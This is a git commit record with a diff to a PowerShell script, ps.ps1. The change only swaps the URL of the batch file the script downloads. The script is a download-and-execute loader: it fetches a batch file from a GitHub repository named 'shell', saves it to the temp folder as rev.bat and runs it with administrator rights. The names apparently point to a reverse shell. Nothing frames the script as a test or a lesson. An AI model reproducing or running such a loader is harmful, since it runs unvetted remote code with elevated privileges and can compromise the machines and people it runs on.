ba3815886debc73bc68af959d7267b2178fc01c7
Omar Samy <osamy7592@gmail.com>
2024-05-04 02:24:40 +0300

    Update ps.ps1

--- ps.ps1
+++ ps.ps1
@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/omarsamyX0/shell/main/rev.bat"
+$url = "https://raw.githubusercontent.com/omarsamyX0/shell/main/run.bat"
 $outputFile = "$env:TEMP\rev.bat"
 Invoke-WebRequest -Uri $url -OutFile $outputFile
 Start-Process -FilePath $outputFile -Wait -Verb RunAs
